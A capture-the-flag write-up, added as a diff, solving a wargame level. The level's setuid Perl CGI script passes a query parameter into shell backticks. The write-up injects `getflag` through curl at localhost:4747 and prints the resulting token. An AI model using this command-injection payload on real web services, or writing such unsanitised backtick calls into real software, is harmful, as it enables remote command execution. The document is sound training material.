@@ -1,0 +1,27 @@
+#a perl script file can be found in the user directory
+#if there are locale issues:
+export LC_ALL="en_US.UTF-8"
+
+ls -l
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+#similar to flag03, this file has setuid
+
+cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+#the script uses Common Gateway Interface (CGI). This determines how data is
+#exchanged between the script and a web server, in this case localhost:4747.
+#info on CGI https://www.tutorialspoint.com/perl/perl_cgi.htm
+#additionally the script contains a subroutine that takes as parameter x
+#using http syntax and curl we can make getflag call using the script setuid
+
+curl http://localhost:4747?x=\`getflag\`
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
